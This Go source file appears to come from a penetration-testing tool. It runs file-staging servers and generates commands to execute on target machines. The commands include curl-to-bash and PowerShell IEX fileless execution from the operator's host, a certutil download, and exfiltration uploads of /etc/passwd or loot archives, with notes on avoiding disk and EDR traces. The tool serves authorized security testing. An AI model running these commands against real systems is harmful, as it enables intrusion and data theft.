package core

import (
	"errors"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

// Supported file staging server engines (Pentest Spec F-31, Line 31).
const (
	FileServerKindBuiltin     = "builtin"
	FileServerKindPython3     = "python3"
	FileServerKindPython2     = "python2"
	FileServerKindUpdog       = "updog"
	FileServerKindImpacketSMB = "impacket-smb"
	FileServerKindPHP         = "php"
	FileServerKindRuby        = "ruby"
)

// FileTransferServerConfig configures an HTTP/SMB file staging & upload catcher server (F-31).
type FileTransferServerConfig struct {
	ID                string `json:"id"`
	Name              string `json:"name"`
	Kind              string `json:"kind"` // "builtin", "python3", "python2", "updog", "impacket-smb", "php", "ruby"
	Directory         string `json:"directory"`
	BindAddress       string `json:"bindAddress"`
	Port              uint16 `json:"port"`
	EnableUpload      bool   `json:"enableUpload"`
	UseTLS            bool   `json:"useTLS"`
	ShareName         string `json:"shareName,omitempty"`
	BasicAuthUser     string `json:"basicAuthUser,omitempty"`
	BasicAuthPassword string `json:"basicAuthPassword,omitempty"`
}

// FileTransferEvent records a single HTTP/transfer request handled by a running server (F-31).
type FileTransferEvent struct {
	Timestamp  string `json:"timestamp"`
	Method     string `json:"method"`
	Path       string `json:"path"`
	RemoteAddr string `json:"remoteAddr"`
	Status     int    `json:"status"`
	Bytes      int64  `json:"bytes"`
	Note       string `json:"note,omitempty"`
}

// FileTransferServerInfo reports live telemetry and status for a file staging server (F-31).
type FileTransferServerInfo struct {
	ID             string              `json:"id"`
	Name           string              `json:"name"`
	Kind           string              `json:"kind"`
	Directory      string              `json:"directory"`
	BindAddress    string              `json:"bindAddress"`
	Port           uint16              `json:"port"`
	EnableUpload   bool                `json:"enableUpload"`
	UseTLS         bool                `json:"useTLS"`
	ShareName      string              `json:"shareName,omitempty"`
	HasBasicAuth   bool                `json:"hasBasicAuth"`
	Status         string              `json:"status"` // "running", "stopped"
	StartedAt      string              `json:"startedAt,omitempty"`
	ServedCount    int                 `json:"servedCount"`
	UploadCount    int                 `json:"uploadCount"`
	CommandPreview string              `json:"commandPreview"`
	OpsecWarnings  []string            `json:"opsecWarnings,omitempty"`
	RecentEvents   []FileTransferEvent `json:"recentEvents,omitempty"`
	ErrorMsg       string              `json:"errorMsg,omitempty"`
}

// HostedFileEntry describes a file or folder inside the staged serving directory (F-31).
type HostedFileEntry struct {
	Name     string `json:"name"`
	RelPath  string `json:"relPath"`
	FullPath string `json:"fullPath"`
	Size     int64  `json:"size"`
	IsDir    bool   `json:"isDir"`
	ModTime  string `json:"modTime"`
	SHA256   string `json:"sha256,omitempty"`
	MD5      string `json:"md5,omitempty"`
}

// NetworkInterfaceIP represents a local host IPv4 address for easy LHOST selection (F-31).
type NetworkInterfaceIP struct {
	Interface string `json:"interface"`
	IP        string `json:"ip"`
	CIDR      string `json:"cidr"`
	IsVPN     bool   `json:"isVpn"`
}

// FileTransferCommandOptions configures target-side transfer & verification command generation (F-31).
type FileTransferCommandOptions struct {
	Filename       string `json:"filename"`
	LocalIP        string `json:"localIp"`
	Port           uint16 `json:"port"`
	UseTLS         bool   `json:"useTLS"`
	TargetOS       string `json:"targetOs"` // "all", "linux", "windows", "macos"
	TargetDestDir  string `json:"targetDestDir,omitempty"`
	ShareName      string `json:"shareName,omitempty"`
	SHA256         string `json:"sha256,omitempty"`
	MD5            string `json:"md5,omitempty"`
	EnableUpload   bool   `json:"enableUpload"`
	UploadFilePath string `json:"uploadFilePath,omitempty"`
	BasicAuthUser  string `json:"basicAuthUser,omitempty"`
}

// TargetTransferMethod represents a ready-to-run download, upload, memory, or hash verification command (F-31).
type TargetTransferMethod struct {
	ID       string `json:"id"`
	Tool     string `json:"tool"`
	Title    string `json:"title"`
	TargetOS string `json:"targetOs"` // "linux", "windows", "macos", "any"
	Category string `json:"category"` // "download", "memory", "upload", "verify"
	Command  string `json:"command"`
	Notes    string `json:"notes,omitempty"`
}

// FileTransferCommandSet contains generated one-liners, target URL, and OPSEC telemetry (F-31).
type FileTransferCommandSet struct {
	Filename      string                 `json:"filename"`
	URL           string                 `json:"url"`
	LocalIP       string                 `json:"localIp"`
	Port          uint16                 `json:"port"`
	SHA256        string                 `json:"sha256,omitempty"`
	MD5           string                 `json:"md5,omitempty"`
	Methods       []TargetTransferMethod `json:"methods"`
	OpsecWarnings []string               `json:"opsecWarnings,omitempty"`
}

// ValidateFileTransferConfig validates staging server parameters before start or command preview (F-31).
func ValidateFileTransferConfig(cfg FileTransferServerConfig) error {
	dir := strings.TrimSpace(cfg.Directory)
	if dir == "" {
		return errors.New("staging directory path cannot be empty")
	}

	fi, err := os.Stat(dir)
	if err != nil {
		if os.IsNotExist(err) {
			return fmt.Errorf("staging directory %q does not exist", dir)
		}
		return fmt.Errorf("failed to inspect staging directory %q: %w", dir, err)
	}
	if !fi.IsDir() {
		return fmt.Errorf("staging path %q is a file, expected a directory", dir)
	}

	if cfg.Port == 0 {
		return errors.New("server port must be between 1 and 65535")
	}

	kind := strings.ToLower(strings.TrimSpace(cfg.Kind))
	validKinds := map[string]bool{
		"":                        true,
		FileServerKindBuiltin:     true,
		FileServerKindPython3:     true,
		FileServerKindPython2:     true,
		FileServerKindUpdog:       true,
		FileServerKindImpacketSMB: true,
		FileServerKindPHP:         true,
		FileServerKindRuby:        true,
	}
	if !validKinds[kind] {
		return fmt.Errorf("unsupported file server kind %q", cfg.Kind)
	}

	addr := strings.TrimSpace(cfg.BindAddress)
	if addr != "" && addr != "0.0.0.0" && addr != "127.0.0.1" && addr != "::" && addr != "::1" {
		if net.ParseIP(addr) == nil {
			return fmt.Errorf("invalid bind IP address %q", cfg.BindAddress)
		}
	}

	return nil
}

// ResolveSafeHostedPath resolves relPath strictly inside rootDir, blocking traversal attacks (../) (F-31).
func ResolveSafeHostedPath(rootDir string, relPath string) (string, error) {
	cleanRoot := strings.TrimSpace(rootDir)
	if cleanRoot == "" {
		return "", errors.New("staging root directory cannot be empty")
	}

	absRoot, err := filepath.Abs(cleanRoot)
	if err != nil {
		return "", fmt.Errorf("failed to resolve root directory: %w", err)
	}

	cleanedRel := strings.TrimSpace(relPath)
	if cleanedRel == "" || cleanedRel == "." || cleanedRel == "/" || cleanedRel == "\\" {
		return absRoot, nil
	}

	// Reject null bytes and explicit traversal attempts
	if strings.ContainsRune(cleanedRel, 0) {
		return "", errors.New("invalid path: null byte not allowed")
	}

	trimmedRel := strings.TrimLeft(filepath.FromSlash(cleanedRel), "/\\")
	candidate := filepath.Join(absRoot, trimmedRel)
	absTarget, err := filepath.Abs(candidate)
	if err != nil {
		return "", fmt.Errorf("failed to resolve target path: %w", err)
	}

	relCheck, err := filepath.Rel(absRoot, absTarget)
	if err != nil {
		return "", fmt.Errorf("path escapes staging root: %w", err)
	}
	if relCheck == ".." || strings.HasPrefix(relCheck, ".."+string(filepath.Separator)) {
		return "", fmt.Errorf("path traversal blocked: %q is outside staging directory", relPath)
	}

	return absTarget, nil
}

// ListHostedFiles lists files and top-level subdirectories inside the staging directory (F-31).
func ListHostedFiles(rootDir string) ([]HostedFileEntry, error) {
	cleanRoot := strings.TrimSpace(rootDir)
	if cleanRoot == "" {
		return []HostedFileEntry{}, nil
	}

	absRoot, err := filepath.Abs(cleanRoot)
	if err != nil {
		return nil, err
	}

	entries, err := os.ReadDir(absRoot)
	if err != nil {
		return nil, fmt.Errorf("failed to read staging directory %q: %w", absRoot, err)
	}

	result := make([]HostedFileEntry, 0, len(entries))
	for _, entry := range entries {
		name := entry.Name()
		// Skip dotfiles like .DS_Store or hidden git dirs from cluttered UI defaults
		if strings.HasPrefix(name, ".") {
			continue
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}

		fullPath := filepath.Join(absRoot, name)
		rec := HostedFileEntry{
			Name:     name,
			RelPath:  filepath.ToSlash(name),
			FullPath: fullPath,
			Size:     info.Size(),
			IsDir:    entry.IsDir(),
			ModTime:  info.ModTime().UTC().Format(time.RFC3339),
		}
		result = append(result, rec)
	}

	// Sort: directories first, then alphabetical case-insensitive
	sort.Slice(result, func(i, j int) bool {
		if result[i].IsDir != result[j].IsDir {
			return !result[i].IsDir // Files first for quick pentest transfer clicking!
		}
		return strings.ToLower(result[i].Name) < strings.ToLower(result[j].Name)
	})

	return result, nil
}

// ListLocalIPv4Interfaces enumerates non-loopback IPv4 addresses on this host so operators can pick LHOST easily (F-31).
func ListLocalIPv4Interfaces() []NetworkInterfaceIP {
	ifaces, err := net.Interfaces()
	if err != nil {
		return []NetworkInterfaceIP{}
	}

	var ips []NetworkInterfaceIP
	for _, iface := range ifaces {
		if (iface.Flags&net.FlagUp) == 0 || (iface.Flags&net.FlagLoopback) != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		lowerName := strings.ToLower(iface.Name)
		isVPN := strings.Contains(lowerName, "tun") ||
			strings.Contains(lowerName, "tap") ||
			strings.Contains(lowerName, "wg") ||
			strings.Contains(lowerName, "vpn") ||
			strings.Contains(lowerName, "utun") ||
			strings.Contains(lowerName, "tailscale") ||
			strings.Contains(lowerName, "zerotier") ||
			strings.Contains(lowerName, "ppp")

		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP == nil {
				continue
			}
			v4 := ipNet.IP.To4()
			if v4 == nil || v4.IsLoopback() || v4.IsLinkLocalUnicast() {
				continue
			}
			ips = append(ips, NetworkInterfaceIP{
				Interface: iface.Name,
				IP:        v4.String(),
				CIDR:      ipNet.String(),
				IsVPN:     isVPN,
			})
		}
	}

	// Prioritize VPN interfaces (tun0, wg0, etc.) first
	sort.SliceStable(ips, func(i, j int) bool {
		if ips[i].IsVPN != ips[j].IsVPN {
			return ips[i].IsVPN
		}
		return ips[i].Interface < ips[j].Interface
	})

	return ips
}

// BuildFileServerCommand generates the CLI invocation for external HTTP/SMB staging tools or describes the built-in server (F-31).
func BuildFileServerCommand(cfg FileTransferServerConfig) string {
	kind := strings.ToLower(strings.TrimSpace(cfg.Kind))
	if kind == "" {
		kind = FileServerKindBuiltin
	}
	dir := sanitizeTransferArg(cfg.Directory, ".")
	addr := sanitizeTransferArg(cfg.BindAddress, "0.0.0.0")
	port := cfg.Port
	if port == 0 {
		if kind == FileServerKindImpacketSMB {
			port = 445
		} else {
			port = 8000
		}
	}

	switch kind {
	case FileServerKindBuiltin:
		mode := "READ-ONLY GET"
		if cfg.EnableUpload {
			mode = "GET + POST/PUT UPLOAD (/upload)"
		}
		return fmt.Sprintf("[DoubleAgent Built-in Go HTTP Server] http://%s:%d serving %q (%s)", addr, port, dir, mode)

	case FileServerKindPython3:
		if addr != "0.0.0.0" {
			return fmt.Sprintf("python3 -m http.server %d --bind %s --directory \"%s\"", port, addr, dir)
		}
		return fmt.Sprintf("python3 -m http.server %d --directory \"%s\"", port, dir)

	case FileServerKindPython2:
		return fmt.Sprintf("cd \"%s\" && python -m SimpleHTTPServer %d", dir, port)

	case FileServerKindUpdog:
		sslFlag := ""
		if cfg.UseTLS {
			sslFlag = " --ssl"
		}
		return fmt.Sprintf("updog -d \"%s\" -p %d%s", dir, port, sslFlag)

	case FileServerKindImpacketSMB:
		share := sanitizeTransferArg(cfg.ShareName, "share")
		return fmt.Sprintf("impacket-smbserver -smb2support %s \"%s\"", share, dir)

	case FileServerKindPHP:
		return fmt.Sprintf("php -S %s:%d -t \"%s\"", addr, port, dir)

	case FileServerKindRuby:
		return fmt.Sprintf("ruby -run -e httpd \"%s\" -p %d", dir, port)

	default:
		return fmt.Sprintf("python3 -m http.server %d --directory \"%s\"", port, dir)
	}
}

// AnalyzeFileTransferOpsec evaluates security & OPSEC considerations for staging servers and transfers (F-31, Spec Section 4).
func AnalyzeFileTransferOpsec(bindAddr string, port uint16, useTLS bool, hasBasicAuth bool, kind string) []string {
	var warnings []string

	trimmedAddr := strings.TrimSpace(bindAddr)
	if trimmedAddr == "127.0.0.1" || trimmedAddr == "localhost" || trimmedAddr == "::1" {
		warnings = append(warnings, "Bound to loopback (127.0.0.1): remote target machines will NOT reach this staging server unless tunneled via SSH -R.")
	}
	if trimmedAddr == "0.0.0.0" || trimmedAddr == "" {
		warnings = append(warnings, "Bound to 0.0.0.0: staging directory is reachable from all local/VPN interfaces while active. Stop the server immediately after transfer.")
	}
	if !useTLS && strings.ToLower(strings.TrimSpace(kind)) != FileServerKindImpacketSMB {
		warnings = append(warnings, "Cleartext HTTP transfer: avoid serving plaintext credentials or sensitive engagement tools across untrusted segments without TLS/SSH tunneling.")
	}
	if strings.ToLower(strings.TrimSpace(kind)) == FileServerKindImpacketSMB {
		warnings = append(warnings, "Impacket SMB server requires port 445 (root/admin privileges on Linux) and may trigger Windows SMB signing/Net-NTLMv2 alerts.")
	}
	if port == 8000 || port == 8080 || port == 8888 {
		warnings = append(warnings, fmt.Sprintf("Port %d is a common dev/pentest staging port; consider port 80, 443, or 8443 if strict outbound firewall egress filtering is active.", port))
	}
	if !hasBasicAuth && strings.ToLower(strings.TrimSpace(kind)) == FileServerKindBuiltin {
		warnings = append(warnings, "No HTTP Basic Auth configured: any host able to reach this port can download staged files.")
	}

	return warnings
}

// GenerateTargetTransferCommands builds OS-tailored download, memory execution, upload/exfil, and hash verification commands (F-31).
func GenerateTargetTransferCommands(opts FileTransferCommandOptions) FileTransferCommandSet {
	filename := sanitizeTransferArg(opts.Filename, "linpeas.sh")
	baseName := filepath.Base(filepath.FromSlash(filename))
	if baseName == "." || baseName == "/" || baseName == "" {
		baseName = "payload.bin"
	}

	localIP := sanitizeTransferArg(opts.LocalIP, "10.10.14.1")
	port := opts.Port
	if port == 0 {
		port = 8000
	}
	scheme := "http"
	if opts.UseTLS {
		scheme = "https"
	}
	share := sanitizeTransferArg(opts.ShareName, "share")

	cleanRelURLPath := strings.TrimLeft(filepath.ToSlash(filename), "/")
	fullURL := fmt.Sprintf("%s://%s:%d/%s", scheme, localIP, port, cleanRelURLPath)
	if (scheme == "http" && port == 80) || (scheme == "https" && port == 443) {
		fullURL = fmt.Sprintf("%s://%s/%s", scheme, localIP, cleanRelURLPath)
	}
	uploadBaseURL := fmt.Sprintf("%s://%s:%d", scheme, localIP, port)
	if (scheme == "http" && port == 80) || (scheme == "https" && port == 443) {
		uploadBaseURL = fmt.Sprintf("%s://%s", scheme, localIP)
	}

	linuxDestDir := "/dev/shm"
	winDestDir := `C:\Users\Public`
	customDest := sanitizeTransferArg(opts.TargetDestDir, "")
	if customDest != "" {
		if strings.Contains(customDest, ":\\") || strings.HasPrefix(customDest, "\\\\") {
			winDestDir = strings.TrimRight(customDest, "\\/")
		} else {
			linuxDestDir = strings.TrimRight(customDest, "/")
		}
	}

	linuxDestPath := fmt.Sprintf("%s/%s", linuxDestDir, baseName)
	winDestPath := fmt.Sprintf(`%s\%s`, winDestDir, baseName)

	curlTLSFlag := ""
	wgetTLSFlag := ""
	psTLSPrefix := ""
	if opts.UseTLS {
		curlTLSFlag = "-k "
		wgetTLSFlag = "--no-check-certificate "
		psTLSPrefix = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; "
	}

	authCurlFlag := ""
	authWgetFlag := ""
	if strings.TrimSpace(opts.BasicAuthUser) != "" {
		userTok := sanitizeTransferArg(opts.BasicAuthUser, "operator")
		authCurlFlag = fmt.Sprintf("-u %s ", userTok)
		authWgetFlag = fmt.Sprintf("--user=%s --ask-password ", userTok)
	}

	targetFilter := strings.ToLower(strings.TrimSpace(opts.TargetOS))
	if targetFilter == "" {
		targetFilter = "all"
	}

	var methods []TargetTransferMethod
	addIfMatchesOS := func(m TargetTransferMethod) {
		if targetFilter == "all" || m.TargetOS == "any" || m.TargetOS == targetFilter ||
			(targetFilter == "macos" && (m.TargetOS == "linux" || m.TargetOS == "macos")) {
			methods = append(methods, m)
		}
	}

	// --- LINUX / MACOS DOWNLOADS ---
	addIfMatchesOS(TargetTransferMethod{
		ID:       "linux-curl",
		Tool:     "curl",
		Title:    "Linux // curl Download to Disk",
		TargetOS: "linux",
		Category: "download",
		Command:  fmt.Sprintf("curl -fsSL %s%s\"%s\" -o \"%s\" && chmod +x \"%s\"", curlTLSFlag, authCurlFlag, fullURL, linuxDestPath, linuxDestPath),
		Notes:    "Stores binary/script directly in shared memory (/dev/shm) to minimize disk artifacts.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "linux-wget",
		Tool:     "wget",
		Title:    "Linux // wget Download",
		TargetOS: "linux",
		Category: "download",
		Command:  fmt.Sprintf("wget -q %s%s\"%s\" -O \"%s\" && chmod +x \"%s\"", wgetTLSFlag, authWgetFlag, fullURL, linuxDestPath, linuxDestPath),
		Notes:    "Classic wget transfer when curl is unavailable.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "linux-python3",
		Tool:     "python3",
		Title:    "Linux // Python 3 urllib One-Liner",
		TargetOS: "linux",
		Category: "download",
		Command:  fmt.Sprintf("python3 -c \"import urllib.request; urllib.request.urlretrieve('%s', '%s')\"", fullURL, linuxDestPath),
		Notes:    "Useful in stripped containers without curl or wget.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "linux-curl-mem",
		Tool:     "curl + pipe",
		Title:    "Linux // In-Memory Pipe Execution (No Disk Write)",
		TargetOS: "linux",
		Category: "memory",
		Command:  fmt.Sprintf("curl -fsSL %s%s\"%s\" | bash", curlTLSFlag, authCurlFlag, fullURL),
		Notes:    "Executes shell scripts (e.g., linpeas.sh) directly in memory without touching disk.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "linux-smb",
		Tool:     "smbclient",
		Title:    "Linux // smbclient Fetch from Impacket SMB",
		TargetOS: "linux",
		Category: "download",
		Command:  fmt.Sprintf("smbclient //%s/%s -N -c 'get \"%s\" \"%s\"'", localIP, share, cleanRelURLPath, linuxDestPath),
		Notes:    "Requires impacket-smbserver active on DoubleAgent host.",
	})

	// --- WINDOWS DOWNLOADS ---
	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-iwr",
		Tool:     "PowerShell iwr",
		Title:    "Windows // Invoke-WebRequest (PowerShell)",
		TargetOS: "windows",
		Category: "download",
		Command:  fmt.Sprintf("%siwr -Uri \"%s\" -OutFile \"%s\" -UseBasicParsing", psTLSPrefix, fullURL, winDestPath),
		Notes:    "Standard PowerShell download; -UseBasicParsing works without IE engine.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-webclient",
		Tool:     "Net.WebClient",
		Title:    "Windows // WebClient.DownloadFile",
		TargetOS: "windows",
		Category: "download",
		Command:  fmt.Sprintf("%s(New-Object System.Net.WebClient).DownloadFile(\"%s\", \"%s\")", psTLSPrefix, fullURL, winDestPath),
		Notes:    "Fast binary download compatible with older PowerShell v2+ targets.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-certutil",
		Tool:     "certutil.exe",
		Title:    "Windows // certutil LOLBin Download",
		TargetOS: "windows",
		Category: "download",
		Command:  fmt.Sprintf("certutil.exe -urlcache -split -f \"%s\" \"%s\"", fullURL, winDestPath),
		Notes:    "OPSEC Note: certutil URL downloads are frequently logged/monitored by Defender & EDR.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-curl",
		Tool:     "curl.exe",
		Title:    "Windows // Native curl.exe (Win10/Server 2019+)",
		TargetOS: "windows",
		Category: "download",
		Command:  fmt.Sprintf("curl.exe -fsSL %s%s\"%s\" -o \"%s\"", curlTLSFlag, authCurlFlag, fullURL, winDestPath),
		Notes:    "Built into modern Windows 10/11 and Server 2019+ by default.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-smb-copy",
		Tool:     "SMB copy",
		Title:    "Windows // Direct SMB Share Copy (No HTTP)",
		TargetOS: "windows",
		Category: "download",
		Command:  fmt.Sprintf("copy \\\\%s\\%s\\%s \"%s\"", localIP, share, strings.ReplaceAll(cleanRelURLPath, "/", "\\"), winDestPath),
		Notes:    "Runs over TCP 445 using impacket-smbserver; avoids PowerShell HTTP telemetry.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-ps-mem",
		Tool:     "IEX DownloadString",
		Title:    "Windows // PowerShell Fileless Script Execution",
		TargetOS: "windows",
		Category: "memory",
		Command:  fmt.Sprintf("%sIEX (New-Object Net.WebClient).DownloadString(\"%s\")", psTLSPrefix, fullURL),
		Notes:    "Loads PowerShell scripts (e.g., PowerUp.ps1 / SharpHound.ps1) into memory without writing to disk.",
	})

	// --- UPLOAD / EXFIL COMMANDS (TARGET -> DOUBLEAGENT /upload) ---
	uploadSrcLinux := sanitizeTransferArg(opts.UploadFilePath, "/etc/passwd")
	uploadSrcWin := sanitizeTransferArg(opts.UploadFilePath, `C:\Windows\Temp\loot.zip`)
	if opts.UploadFilePath != "" {
		uploadSrcLinux = sanitizeTransferArg(opts.UploadFilePath, "/etc/passwd")
		uploadSrcWin = sanitizeTransferArg(opts.UploadFilePath, `C:\Windows\Temp\loot.zip`)
	}
	uploadBaseFile := filepath.Base(filepath.FromSlash(uploadSrcWin))
	if uploadBaseFile == "." || uploadBaseFile == "" {
		uploadBaseFile = "loot.bin"
	}

	addIfMatchesOS(TargetTransferMethod{
		ID:       "linux-upload-curl",
		Tool:     "curl POST",
		Title:    "Linux // Exfil / Upload File to DoubleAgent",
		TargetOS: "linux",
		Category: "upload",
		Command:  fmt.Sprintf("curl -fsSL %s%s-F \"file=@%s\" \"%s/upload\"", curlTLSFlag, authCurlFlag, uploadSrcLinux, uploadBaseURL),
		Notes:    "Uploads target file into DoubleAgent's staging folder (requires Enable Upload ON).",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-upload-curl",
		Tool:     "curl.exe PUT",
		Title:    "Windows // Exfil / Upload File via curl.exe",
		TargetOS: "windows",
		Category: "upload",
		Command:  fmt.Sprintf("curl.exe -fsSL %s%s-F \"file=@%s\" \"%s/upload\"", curlTLSFlag, authCurlFlag, uploadSrcWin, uploadBaseURL),
		Notes:    "Streams target loot/dumps back to DoubleAgent's HTTP Upload receiver.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-upload-ps",
		Tool:     "Invoke-RestMethod",
		Title:    "Windows // Exfil / Upload File via PowerShell PUT",
		TargetOS: "windows",
		Category: "upload",
		Command:  fmt.Sprintf("%sInvoke-RestMethod -Uri \"%s/upload/%s\" -Method Put -InFile \"%s\"", psTLSPrefix, uploadBaseURL, uploadBaseFile, uploadSrcWin),
		Notes:    "Pure PowerShell binary PUT upload without needing curl.exe.",
	})

	// --- HASH INTEGRITY VERIFICATION ---
	expectedSHA := strings.TrimSpace(opts.SHA256)
	expectedMD5 := strings.TrimSpace(opts.MD5)

	shaVerifyLinux := fmt.Sprintf("sha256sum \"%s\"", linuxDestPath)
	if expectedSHA != "" {
		shaVerifyLinux = fmt.Sprintf("echo \"%s  %s\" | sha256sum -c -", expectedSHA, linuxDestPath)
	}
	addIfMatchesOS(TargetTransferMethod{
		ID:       "linux-verify-sha256",
		Tool:     "sha256sum",
		Title:    "Linux // Verify SHA-256 Integrity",
		TargetOS: "linux",
		Category: "verify",
		Command:  shaVerifyLinux,
		Notes:    "Confirms downloaded payload matches exact SHA-256 digest before execution.",
	})

	md5VerifyLinux := fmt.Sprintf("md5sum \"%s\"", linuxDestPath)
	if expectedMD5 != "" {
		md5VerifyLinux = fmt.Sprintf("echo \"%s  %s\" | md5sum -c -", expectedMD5, linuxDestPath)
	}
	addIfMatchesOS(TargetTransferMethod{
		ID:       "linux-verify-md5",
		Tool:     "md5sum",
		Title:    "Linux // Verify MD5 Checksum",
		TargetOS: "linux",
		Category: "verify",
		Command:  md5VerifyLinux,
		Notes:    "Fallback MD5 check for busybox/minimal embedded targets.",
	})

	psVerify := fmt.Sprintf("(Get-FileHash \"%s\" -Algorithm SHA256).Hash", winDestPath)
	if expectedSHA != "" {
		psVerify = fmt.Sprintf("(Get-FileHash \"%s\" -Algorithm SHA256).Hash -eq \"%s\"", winDestPath, strings.ToUpper(expectedSHA))
	}
	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-verify-ps",
		Tool:     "Get-FileHash",
		Title:    "Windows // PowerShell SHA-256 Integrity Check",
		TargetOS: "windows",
		Category: "verify",
		Command:  psVerify,
		Notes:    "Returns True when on-disk file matches the staged SHA-256 digest.",
	})

	addIfMatchesOS(TargetTransferMethod{
		ID:       "win-verify-certutil",
		Tool:     "certutil -hashfile",
		Title:    "Windows // cmd.exe Hash Check (SHA-256)",
		TargetOS: "windows",
		Category: "verify",
		Command:  fmt.Sprintf("certutil -hashfile \"%s\" SHA256", winDestPath),
		Notes:    "Compare against expected SHA-256: " + nonEmptyOrPlaceholder(expectedSHA, "<compute hash first>"),
	})

	warns := AnalyzeFileTransferOpsec(localIP, port, opts.UseTLS, strings.TrimSpace(opts.BasicAuthUser) != "", FileServerKindBuiltin)

	return FileTransferCommandSet{
		Filename:      filename,
		URL:           fullURL,
		LocalIP:       localIP,
		Port:          port,
		SHA256:        expectedSHA,
		MD5:           expectedMD5,
		Methods:       methods,
		OpsecWarnings: warns,
	}
}

func sanitizeTransferArg(raw string, fallback string) string {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return fallback
	}
	// Strip shell-injection / control characters while keeping paths (/, \, :, ., -, _, spaces) intact
	replacer := strings.NewReplacer(
		"\r", "",
		"\n", "",
		"\x00", "",
		"`", "",
		";", "",
		"|", "",
		"&", "",
		"$", "",
		">", "",
		"<", "",
		"'", "",
		"\"", "",
	)
	cleaned := strings.TrimSpace(replacer.Replace(trimmed))
	if cleaned == "" {
		return fallback
	}
	return cleaned
}

func nonEmptyOrPlaceholder(val, fallback string) string {
	if strings.TrimSpace(val) == "" {
		return fallback
	}
	return val
}
